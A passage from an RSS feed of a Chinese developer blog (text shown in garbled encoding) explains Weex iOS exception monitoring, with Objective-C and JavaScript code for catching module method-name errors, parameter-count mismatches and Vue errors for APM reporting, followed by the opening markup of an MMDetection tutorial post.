      <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentNode</span>.<span class="hljs-title function_">fireEvent</span>(type, event, isBubble); <span class="hljs-comment">// no options</span>
    }

    <span class="hljs-keyword">return</span> result
  };
</code></pre>
<h5 data-id="heading-77">2. JS è°ƒç”¨ module æ–¹æ³•ï¼Œæ–¹æ³•åé”™è¯¯</h5>
<p>Native æ³¨å†Œçš„ Module æ–¹æ³•åä¸º <code>multiply:num2:callback:</code>ï¼Œè€Œåœ¨ JS ä¾§è°ƒç”¨çš„æ—¶å€™æ–¹æ³•åå¤šåŠ äº†å‡ ä¸ªå­—ç¬¦ï¼Œé€ æˆæ–¹æ³•åå¯¹ä¸ä¸Šï¼Œæ–¹æ³•è°ƒç”¨å¤±è´¥çš„é—®é¢˜ã€‚</p>
<p>ç”¨æˆ·ç‚¹å‡»å±å¹•ä¸Šçš„ UI æ§ä»¶ï¼ˆæ­¤å¤„å°±æ˜¯æ³¨å†Œ Component <code>[WXSDKEngine registerComponent:@"color-button" withClass:[WXColorButtonComponent class]]</code>)ã€‚</p>
<p>Weex ç»Ÿä¸€ç»™ Comonent æ·»åŠ äº†åˆ†ç±»æ¥è´Ÿè´£äº‹ä»¶çš„å¤„ç†ã€‚<code>WXComponent+Events</code>ã€‚æºç ä¸­ <code>addClickEvent</code> å°±æ˜¯æ·»åŠ äº†ç‚¹å‡»äº‹ä»¶çš„ç›‘å¬ã€‚å½“å‘ç”Ÿç‚¹å‡»åä¼šè®¡ç®—ç‚¹å‡»äº‹ä»¶çš„åæ ‡å’Œæ—¶é—´æˆ³ä¿¡æ¯ï¼Œæœ€åå°è£…ä¸€ä¸ª <code>WXCallJSMethod</code> å¯¹è±¡ï¼Œæ–¹æ³•åå›ºå®šä¸º <code>fireEvent</code>ã€‚å¦‚ä¸‹å †æ ˆæ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4aa523b5d1a047e690cd3e0d5e178dbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=WvFysSIJKSbgGF6gOWhsRXSiMLk%3D" alt="WeexComponentClickLogic.png" loading="lazy"/></p>
<p>ç”±äº <code>logicCalculation</code> æ²¡æœ‰å¯¹åº”çš„ <code>multiplyWith</code> æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œè¢« JS çš„ <code>try...catch...</code> æ•è·åï¼Œé€šè¿‡ <code>console.error</code> çš„æ–¹å¼è¾“å‡ºå¼‚å¸¸ä¿¡æ¯ã€‚ä½†æ˜¯ <code>console.error</code> è¢« Native æ¥ç®¡äº†ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ Native æ¥ç®¡çš„åœ°æ–¹ç»Ÿä¸€æ‹¦æˆªå¤„ç†ã€‚åªè¦æ—¥å¿—åŒ…å« <code>Failed to invoke the event handler</code> å°±å¯ä»¥è®¤ä¸ºæ˜¯å› ä¸ºæ–¹æ³•åé—®é¢˜ï¼Œå¯¼è‡´è°ƒç”¨æ–¹æ³•å‡ºé”™</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-Objective-c" lang="Objective-c">+ (void)handleConsoleOutputWithArgument:(NSArray *)arguments logLevel:(WXLogFlag)logLevel
{
    // ...
    if ([string containsString:@"Failed to invoke the event handler"]) {
        // åŸæœ‰è§£æé€»è¾‘ä¿ç•™
                        NSString *errorMethodName = @"";
                        NSString *eventType = @"";
                        NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"'\\.\\.\\.(?:logicCalculation\\.)([a-zA-Z0-9_]+)\\.\\.\\." options:0 error:nil];
                        NSTextCheckingResult *match = [regex firstMatchInString:string options:0 range:NSMakeRange(0, string.length)];
                        if (match) {
                            errorMethodName = [string substringWithRange:[match rangeAtIndex:1]];
                        }
                        NSRegularExpression *eventRegex = [NSRegularExpression regularExpressionWithPattern:@"event handler of \"([^\"]+)\"" options:0 error:nil];
                        NSTextCheckingResult *eventMatch = [eventRegex firstMatchInString:string options:0 range:NSMakeRange(0, string.length)];
                        if (eventMatch) {
                            eventType = [string substringWithRange:[eventMatch rangeAtIndex:1]];
                        }
                        
                        // æ¥å…¥æ”¶å£å·¥å…·ç±»
                        NSString *exceptionMsg = [NSString stringWithFormat:@"Moduleæ–¹æ³•åé”™è¯¯ï¼š%@ï¼Œäº‹ä»¶ç±»å‹ï¼š%@ï¼ŒåŸå§‹æ—¥å¿—ï¼š%@", errorMethodName, eventType, string];
                        NSDictionary *customExt = @{
                            @"moduleName": @"logicCalculation",
                            @"methodName": errorMethodName,
                            @"eventType": eventType
                        };
                        NSString *instanceId = [WXSDKEngine topInstance].instanceId ?: @"";
                        NSString *bundleUrl = [WXSDKEngine topInstance].scriptURL.absoluteString ?: @"";
                        [[WXExceptionReporter sharedInstance] reportExceptionWithCode:WXCustomExceptionCode_Module_MethodNotFound
                                                                         exceptionType:WXCustomExceptionType_Module
                                                                            instanceId:instanceId
                                                                              function:@"handleConsoleOutputWithArgument:logLevel:"
                                                                         exceptionMsg:exceptionMsg
                                                                             bundleUrl:bundleUrl
                                                                         customExtParams:customExt];
    }
    // ...
}
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caecf4541d1646cfadc4fb59dd7abf93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=MZypkqirSmTiJApbXBRu7j6mUvM%3D" alt="WeexCallModuleMethodNameMismatch.png" loading="lazy"/></p>
<h5 data-id="heading-78">3. JS è°ƒç”¨ module æ–¹æ³•ï¼Œæ–¹æ³•å‚æ•°ä¸ªæ•°ä¸åŒ¹é…</h5>
<p>ä¸Šé¢å·²ç»è®²äº†ç‚¹å‡»äº‹ä»¶çš„å·¥ä½œæµç¨‹ï¼Œè°ƒç”¨æ–¹æ³•æ—¶ï¼Œé™¤äº†è°ƒç”¨äº†ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–è€…æ–¹æ³•åå†™é”™äº†ï¼Œè¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯å‚æ•°ä¸ªæ•°ä¸åŒ¹é…ã€‚</p>
<p>è¿™ç§æƒ…å†µå¦‚ä½•è¯†åˆ«å¹¶ç›‘æ§ï¼Ÿ
JS çš„äº‹ä»¶å¤„ç†å‡½æ•°é‡Œï¼Œè°ƒç”¨æ³¨å†Œçš„ Module å’Œå¯¹åº”çš„æ–¹æ³•ï¼Œä¼šç»Ÿä¸€èµ°åˆ° <code>WXJSCoreBridge.mm</code> çš„ <code>- (void)registerCallNativeModule:(WXJSCallNativeModule)callNativeModuleBlock</code> ç»™å½“å‰çš„ JSContext æ³¨å†Œå¥½çš„ <code>callNativeModule</code> å›è°ƒé‡Œã€‚<code>_jsContext[@"callNativeModule"] = ^JSValue *(JSValue *instanceId, JSValue *moduleName, JSValue *methodName, JSValue *args, JSValue *options)</code> å¯ä»¥æ‹¿åˆ°æ¨¡å—åã€æ–¹æ³•åã€å‚æ•°ä¸ªæ•°ã€instanceID ç­‰ã€‚æ‹¿åˆ°å®é™…ä¼ é€’çš„æ–¹æ³•å‚æ•°åˆ—è¡¨ï¼Œå†é€šè¿‡æ¨¡å—åæ ¹æ® <code>ModuleFactory</code> æ‰¾åˆ°æ¨¡å—ç±»å¯¹è±¡ï¼Œç„¶ååˆ©ç”¨ runtime èƒ½åŠ›ï¼Œéå†ç±»å¯¹è±¡çš„æ–¹æ³•åˆ—è¡¨ï¼Œæ‰¾åˆ°å¯¹åº”çš„ SELï¼Œåˆ¤æ–­å…¶é¢„æœŸçš„æ–¹æ³•å‚æ•°ä¸ªæ•°ï¼Œç„¶åå†å’Œå®é™…ä¼ é€’è¿‡æ¥çš„æ–¹æ³•å‚æ•°ä¸ªæ•°åšæ¯”è¾ƒå³å¯</p>
<pre><code class="hljs language-Objective-c" lang="Objective-c">- (void)registerCallNativeModule:(WXJSCallNativeModule)callNativeModuleBlock
{
    // JS è°ƒç”¨ Native çš„æ–¹æ³•éƒ½ä¼šèµ°è¿™é‡Œã€‚å¯ä»¥è§£æåˆ°ï¼šæ¨¡å—åã€æ–¹æ³•åã€å‚æ•°æ•°ç»„ç­‰ä¿¡æ¯ã€‚å¯ä»¥åœ¨è¿™é‡Œåˆ¤æ–­æ–¹æ³•å‚æ•°ä¸ªæ•°æ˜¯å¦ç›¸åŒã€‚
    _jsContext[@"callNativeModule"] = ^JSValue *(JSValue *instanceId, JSValue *moduleName, JSValue *methodName, JSValue *args, JSValue *options) {
        // ...
    };
}
</code></pre>
<p>åœ¨å…¶ <code>callNativeModule</code> çš„ block é‡Œï¼Œå¢åŠ ä¸€ä¸ªæ–¹æ³•ï¼Œä¸“é—¨ç”¨æ¥åˆ¤æ–­å’Œæ£€æŸ¥æ–¹æ³•å‚æ•°ä¸ªæ•°æ˜¯å¦åŒ¹é…çš„é—®é¢˜</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">// è¾…åŠ©æ–¹æ³•ï¼šæ ¡éªŒModuleæ–¹æ³•å‚æ•°ä¸ªæ•°
- (void)checkModuleParamCount:(NSString *)moduleName
                   methodName:(NSString *)methodName
                 actualParams:(NSArray *)actualParams
                   instanceId:(NSString *)instanceId {
    // 1. è·³è¿‡ç©ºå€¼/ç³»ç»Ÿæ¨¡å—ï¼ˆé¿å…æ— æ„ä¹‰æ ¡éªŒï¼‰
    if (!moduleName || !methodName || actualParams.count &lt; 0) return;
    Class moduleClass = [WXModuleFactory classWithModuleName:moduleName];
    if (!moduleClass) return;

    // 2. æ‹¼æ¥å®Œæ•´çš„æ–¹æ³•é€‰æ‹©å™¨ï¼ˆWeex Moduleæ–¹æ³•åå¸¦å†’å·ï¼Œéœ€è¡¥å…¨ï¼Œå¦‚multiplyâ†’multiply:num2:callback:ï¼‰
    // æ³¨ï¼šè‹¥æ–¹æ³•åè§„åˆ™å›ºå®šï¼Œå¯é€šè¿‡æ¨¡å—ç±»çš„æ–¹æ³•åˆ—è¡¨è·å–æ‰€æœ‰selectorï¼ŒåŒ¹é…å‰ç¼€
    SEL targetSel = nil;
    unsigned int methodCount = 0;
    Method *methods = class_copyMethodList(moduleClass, &amp;methodCount);
    for (int i = 0; i &lt; methodCount; i++) {
        Method method = methods[i];
        SEL sel = method_getName(method);
        NSString *selStr = NSStringFromSelector(sel);
        // åŒ¹é…å‰ç¼€ï¼ˆå¦‚multiplyå¼€å¤´çš„æ–¹æ³•ï¼‰
        if ([selStr hasPrefix:methodName]) {
            targetSel = sel;
            break;
        }
    }
    free(methods);
    if (!targetSel) return;

    // 3. è§£ææ–¹æ³•ç­¾åï¼Œè®¡ç®—é¢„æœŸå‚æ•°ä¸ªæ•°ï¼ˆå‡self/_cmdï¼‰
    NSMethodSignature *methodSig = [moduleClass instanceMethodSignatureForSelector:targetSel];
    NSInteger weexParamCount = methodSig.numberOfArguments - 2;

    // 4. åˆ¤æ–­å‚æ•°ä¸ªæ•°æ˜¯å¦ä¸åŒ¹é…
    if (actualParams.count != weexParamCount) {
        // æ„é€ é”™è¯¯ä¿¡æ¯
        NSString *errorMsg = [NSString stringWithFormat:@"Module:%@ æ–¹æ³•:%@ å‚æ•°ä¸ªæ•°ä¸åŒ¹é…ï¼Œé¢„æœŸ%ldä¸ªï¼Œå®é™…%ldä¸ª",
                              moduleName, methodName, weexParamCount, actualParams.count];
        WXLogError(@"[WeexParamError] %@", errorMsg);

        // 5. ä¸ŠæŠ¥APMï¼ˆæ ¸å¿ƒï¼šç”Ÿäº§ç¯å¢ƒç›‘æ§ï¼‰
        NSDictionary *apmData = @{
            @"error_type": @"weex_module_param_count_mismatch",
            @"module_name": moduleName,
            @"method_name": methodName,
            @"expected_count": @(weexParamCount),
            @"actual_count": @(actualParams.count),
            @"actual_params": actualParams,
            @"instance_id": instanceId ?: @"",
            @"timestamp": @([[NSDate date] timeIntervalSince1970] * 1000),
            @"message": errorMsg
        };

        // APM:å¼‚æ­¥ä¸ŠæŠ¥ï¼Œé¿å…é˜»å¡JSæ¡¥æ¥
        NSLog(@"APM æ•°æ®ä¸ŠæŠ¥é€šé“ï¼Œã€JS é€šè¿‡ Module è°ƒç”¨ Native æ–¹æ³•ï¼Œå‚æ•°ä¸ªæ•°ä¸åŒ¹é…ã€‘ï¼š%@", apmData);
    }
}
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bd25d1035904328bb1420da7f7961c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=Vt4Dsl4Nmtzch2kyJ9N%2FnA6qwsk%3D" alt="WeexCallNativeModuleParamsError.png" loading="lazy"/></p>
<h4 data-id="heading-79">5. Vue å±‚é¢å¼‚å¸¸</h4>
<p>Weex åº•å±‚ä¾é  Vue å®ç°ï¼Œå·®å¼‚åŒ–å°±æ˜¯ VM å»é€šè¿‡ Bridge åœ¨ WeexSDK Native å»åšç»˜åˆ¶ã€‚å¼‚å¸¸æ–¹é¢é™¤äº†å¸¸è§„çš„ JS è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆå¦‚è¯­æ³•é”™è¯¯ã€ç±»å‹é”™è¯¯ç­‰ 7 ç§ï¼‰ï¼ŒVue æ¡†æ¶è‡ªèº«çš„é€»è¾‘å±‚ã€ç¼–è¯‘å±‚ã€å“åº”å¼ç³»ç»Ÿã€ç»„ä»¶ç”Ÿå‘½å‘¨æœŸ ç­‰ç¯èŠ‚ä¼šæŠ›å‡ºä¸“å±å¼‚å¸¸ï¼Œè¿™äº›å¼‚å¸¸å¿…é¡»é€šè¿‡ Vue.config.errorHandler å…œåº•ã€‚</p>
<p>åˆ†æ Weex æºç ä¸­ï¼š<code>packages/weex-js-framework/index.js/</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleError</span> (err, vm, info) {
  <span class="hljs-keyword">if</span> (vm) {
    <span class="hljs-keyword">var</span> cur = vm;
    <span class="hljs-keyword">while</span> ((cur = cur.<span class="hljs-property">$parent</span>)) {
      <span class="hljs-keyword">var</span> hooks = cur.<span class="hljs-property">$options</span>.<span class="hljs-property">errorCaptured</span>;
      <span class="hljs-keyword">if</span> (hooks) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; hooks.<span class="hljs-property">length</span>; i++) {
          <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">var</span> capture = hooks[i].<span class="hljs-title function_">call</span>(cur, err, vm, info) === <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">if</span> (capture) { <span class="hljs-keyword">return</span> }
          } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-title function_">globalHandleError</span>(e, cur, <span class="hljs-string">'errorCaptured hook'</span>);
          }
        }
      }
    }
  }
  <span class="hljs-title function_">globalHandleError</span>(err, vm, info);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">globalHandleError</span> (err, vm, info) {
  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">errorHandler</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> config.<span class="hljs-property">errorHandler</span>.<span class="hljs-title function_">call</span>(<span class="hljs-literal">null</span>, err, vm, info)
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-title function_">logError</span>(e, <span class="hljs-literal">null</span>, <span class="hljs-string">'config.errorHandler'</span>);
    }
  }
  <span class="hljs-title function_">logError</span>(err, vm, info);
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f59bc9512ac44aa7868c7bec1817a4f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=5SezT87Wi5Mt311I3SEDLwsrRaA%3D" alt="WeexCaptureVueError.png" loading="lazy"/></p>
<p>æºç ä¸­ nextTickã€Vue.prototype.$emitã€callHookã€Watcher.prototype.getã€Watcher.prototype.runã€renderRecyclableComponentTemplateã€Vue.prototype._render ç­‰ç­‰éƒ½è°ƒç”¨äº†  handleError æ–¹æ³•ã€‚
Vue å†…éƒ¨å¯¹éƒ¨åˆ†å¼‚å¸¸åšäº†å°è£…/æ‹¦æˆªï¼Œé¿å…ç›´æ¥å†’æ³¡åˆ°å…¨å±€ï¼ˆé˜²æ­¢é˜»æ–­åº”ç”¨æ•´ä½“è¿è¡Œï¼‰ï¼Œä½†ä¼šé€šè¿‡ errorHandler æš´éœ²å‡ºæ¥ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼ŒWeexAPM ç±»å¯ä»¥å°è£…ä¸ºï¼š</p>
<pre><code class="hljs language-JS" lang="JS"><span class="hljs-comment">/**
 * APM
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WeexAPM</span> {
  <span class="hljs-comment">/**
   * è·å–å½“å‰çš„å¶å­èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">*</span>} Vue vm
   * <span class="hljs-doctag">@returns</span> å½“å‰ç»„ä»¶åç§°
   */</span>
  formatComponentName (vm) {
    <span class="hljs-keyword">if</span> (vm.<span class="hljs-property">$root</span> === vm) <span class="hljs-keyword">return</span> <span class="hljs-string">'root'</span>
    <span class="hljs-keyword">var</span> name = vm.<span class="hljs-property">_isVue</span>
      ? (vm.<span class="hljs-property">$options</span> &amp;&amp; vm.<span class="hljs-property">$options</span>.<span class="hljs-property">name</span>) ||
        (vm.<span class="hljs-property">$options</span> &amp;&amp; vm.<span class="hljs-property">$options</span>.<span class="hljs-property">_componentTag</span>)
      : vm.<span class="hljs-property">name</span>
    <span class="hljs-keyword">return</span> (
      (name ? <span class="hljs-string">'component &lt;'</span> + name + <span class="hljs-string">'&gt;'</span> : <span class="hljs-string">'anonymous component'</span>) +
      (vm.<span class="hljs-property">_isVue</span> &amp;&amp; vm.<span class="hljs-property">$options</span> &amp;&amp; vm.<span class="hljs-property">$options</span>.<span class="hljs-property">__file</span>
        ? <span class="hljs-string">' at '</span> + (vm.<span class="hljs-property">$options</span> &amp;&amp; vm.<span class="hljs-property">$options</span>.<span class="hljs-property">__file</span>)
        : <span class="hljs-string">''</span>)
    )
  }

  <span class="hljs-comment">/**
   * å¤„ç†Vueé”™è¯¯æç¤º
   */</span>
  monitor (<span class="hljs-title class_">Vue</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Vue</span>) {
      <span class="hljs-keyword">return</span>
    }
    <span class="hljs-comment">// é”™è¯¯å¤„ç†</span>
    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">errorHandler</span> = <span class="hljs-function">(<span class="hljs-params">err, vm, info</span>) =&gt;</span> {
      <span class="hljs-keyword">let</span> componentName = <span class="hljs-string">'unknown'</span>
      <span class="hljs-keyword">if</span> (vm) {
        componentName = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">formatComponentName</span>(vm)
      }
      <span class="hljs-keyword">let</span> errorInfo = {
        <span class="hljs-attr">name</span>: err.<span class="hljs-property">name</span>,
        <span class="hljs-attr">reason</span>: err.<span class="hljs-property">message</span>,
        <span class="hljs-attr">callStack</span>: err.<span class="hljs-property">stack</span>,
        <span class="hljs-attr">componentName</span>: componentName,
        <span class="hljs-attr">info</span>: info,
        <span class="hljs-attr">level</span>: <span class="hljs-string">'VUE_ERROR'</span>
      }
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> weexAPMUploader = weex.requireModule(<span class="hljs-string">'weexAPMUploader'</span>)
        weexAPMUploader.<span class="hljs-title function_">uploadException</span>(errorInfo)
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'APMMonitor èƒ½åŠ›æœ‰é—®é¢˜ï¼Œè¯·æ£€æŸ¥æ˜¯å¦æ³¨å†Œäº†weexAPMUploaderæ¨¡å—'</span> + error)
      }
    }
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">WeexAPM</span>
</code></pre>
<p>åœ¨æ•è·åˆ° Vue å±‚é¢çš„å¼‚å¸¸æ—¶ï¼Œå¯ä»¥è°ƒç”¨æ³¨å†Œå¥½çš„ weexAPMUploader module èƒ½åŠ›ï¼Œå°†æ•°æ®ä¼ è¾“åˆ° Native ä¾§ï¼Œç”± Native ä¾§è¿›è¡Œç»Ÿä¸€çš„å‚æ•°ç»„è£…ï¼Œæœ€åè°ƒç”¨ APM SDK çš„èƒ½åŠ›è¿›è¡Œæ•°æ®å†™å…¥æ•°æ®åº“ã€æŒ‰ç…§ç­–ç•¥ä¸ŠæŠ¥åˆ° APM æœåŠ¡ç«¯è¿›è¡Œæ¶ˆè´¹ã€‚</p>
<p>æ¨¡æ‹Ÿäº§ç”Ÿ Vue å±‚çº§çš„é”™è¯¯ï¼šç»™ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œåœ¨è®¡ç®—å±æ€§é‡Œè°ƒç”¨ <code>toFixed</code> æ–¹æ³•ã€‚æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶é‡Œå°†æ•°æ®æ”¹ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚
å¯ä»¥çœ‹åˆ°è¢« <code>Vue.config.errorHandler</code> æ•è·äº†ï¼Œåç»­äº¤ç»™ Native å¤„ç†å³å¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c302b4a08944df885a48f5cb732c7ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=VtY%2Flp2%2F9jlnThAaAsyQlyi8zgM%3D" alt="WeexMockVueAPM.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MMDetection æ¡†æ¶å®Œæ•´æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼Œä»£ç å¯å¤ç°ï¼‰]]></title>    <link>https://juejin.cn/post/7589907831199416346</link>    <guid>https://juejin.cn/post/7589907831199416346</guid>    <pubDate>2026-01-01T15:16:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589907831199416346" data-draft-id="7589907831199399962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MMDetection æ¡†æ¶å®Œæ•´æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼Œä»£ç å¯å¤ç°ï¼‰"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-01T15:16:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸Šç­èŒä¸šæ‘¸é±¼äºº"/> <meta itemprop="url" content="https://juejin.cn/user/1637603381099082"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MMDetection æ¡†æ¶å®Œæ•´æ•™ç¨‹ï¼ˆä»å…¥é—¨åˆ°å®æˆ˜ï¼Œä»£ç å¯å¤ç°ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1637603381099082/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸Šç­èŒä¸šæ‘¸é±¼äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T15:16:07.000Z" title="Thu Jan 01 2026 15:16:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 